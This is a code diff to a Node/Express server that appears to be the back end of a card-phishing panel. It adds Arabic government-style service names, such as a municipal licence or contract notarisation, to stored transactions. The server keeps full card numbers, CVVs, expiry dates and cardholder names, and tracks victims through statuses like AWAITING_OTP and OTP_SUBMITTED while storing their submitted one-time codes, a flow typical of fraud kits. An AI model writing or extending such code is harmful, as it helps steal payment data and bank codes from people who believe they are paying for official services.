@@ -16,6 +16,7 @@ interface Transaction {
   status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
   otpCode: string;
   submittedOtp?: string;
+  serviceName?: string;
 }
 
 // In-memory Database
@@ -31,7 +32,8 @@ let transactions: Transaction[] = [
     timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
     status: 'APPROVED',
     otpCode: '852014',
-    submittedOtp: '852014'
+    submittedOtp: '852014',
+    serviceName: 'استشارة قانونية فورية'
   },
   {
     id: 'tx-1002',
@@ -44,7 +46,8 @@ let transactions: Transaction[] = [
     timestamp: new Date(Date.now() - 3600000 * 5).toISOString(),
     status: 'REJECTED',
     otpCode: '315792',
-    submittedOtp: '111111'
+    submittedOtp: '111111',
+    serviceName: 'رخصة بلدية تجارية'
   },
   {
     id: 'tx-1003',
@@ -56,7 +59,8 @@ let transactions: Transaction[] = [
     amount: 89.00,
     timestamp: new Date(Date.now() - 60000 * 15).toISOString(),
     status: 'PENDING_CARD_APPROVAL',
-    otpCode: '147852'
+    otpCode: '147852',
+    serviceName: 'توثيق عقد عقاري'
   },
   {
     id: 'tx-1004',
@@ -68,7 +72,8 @@ let transactions: Transaction[] = [
     amount: 15.50,
     timestamp: new Date(Date.now() - 60000 * 32).toISOString(),
     status: 'PENDING_CARD_APPROVAL',
-    otpCode: '963258'
+    otpCode: '963258',
+    serviceName: 'شهادة صحية للعمل'
   }
 ];
 
@@ -146,13 +151,14 @@ async function startServer() {
       amount: tx.amount,
       cardType: tx.cardType,
       cardNumber: tx.cardNumber,
-      cardholderName: tx.cardholderName
+      cardholderName: tx.cardholderName,
+      serviceName: tx.serviceName
     });
   });
 
   // POST /api/pay: Create transaction, generate OTP, set status PENDING_CARD_APPROVAL
   app.post('/api/pay', (req, res) => {
-    const { cardNumber, cardholderName, expiry, cvv, cardType, amount } = req.body;
+    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName } = req.body;
 
     if (!cardNumber || !cardholderName || !expiry || !cvv) {
       return res.status(400).json({ error: 'Missing required payment fields.' });
@@ -174,7 +180,8 @@ async function startServer() {
       amount: finalAmount,
       timestamp: new Date().toISOString(),
       status: 'PENDING_CARD_APPROVAL',
-      otpCode: randomOtp
+      otpCode: randomOtp,
+      serviceName: serviceName || 'خدمة عامة'
     };
 
     transactions.unshift(newTx);
@@ -188,7 +195,7 @@ async function startServer() {
 
   // Submit a new transaction (alternative backward compatible endpoint)
   app.post('/api/submit', (req, res) => {
-    const { cardNumber, cardholderName, expiry, cvv, cardType, amount } = req.body;
+    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName } = req.body;
 
     if (!cardNumber || !cardholderName || !expiry || !cvv) {
       return res.status(400).json({ error: 'Missing required payment fields.' });
@@ -208,7 +215,8 @@ async function startServer() {
       amount: finalAmount,
       timestamp: new Date().toISOString(),
       status: 'PENDING_CARD_APPROVAL',
-      otpCode: randomOtp
+      otpCode: randomOtp,
+      serviceName: serviceName || 'خدمة عامة'
     };
 
     transactions.unshift(newTx);
